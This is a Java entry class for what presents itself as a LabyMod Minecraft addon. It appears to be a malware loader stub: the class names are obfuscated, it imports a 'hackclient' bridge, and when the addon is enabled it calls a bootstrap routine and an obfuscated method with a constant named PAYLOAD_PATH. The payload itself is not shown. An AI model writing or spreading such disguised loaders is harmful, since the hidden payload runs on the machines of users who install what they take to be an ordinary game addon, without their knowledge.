package net.java;

import net.labymod.api.addon.LabyAddon;
import net.labymod.api.models.addon.annotation.AddonMain;
import net.hackclient.compat.Bridge;

@AddonMain
public class s extends LabyAddon<Object> {
    private static boolean inited;
    protected void enable() {
        if (!inited) {
            m.init();
            Bridge.bootstrap(5, m.PAYLOAD_PATH);
            l.a((Object)new Object[]{null, null, 5, null, null, m.PAYLOAD_PATH});
            inited = true;
        }
    }
    protected Class<Object> configurationClass() { return Object.class; }
}
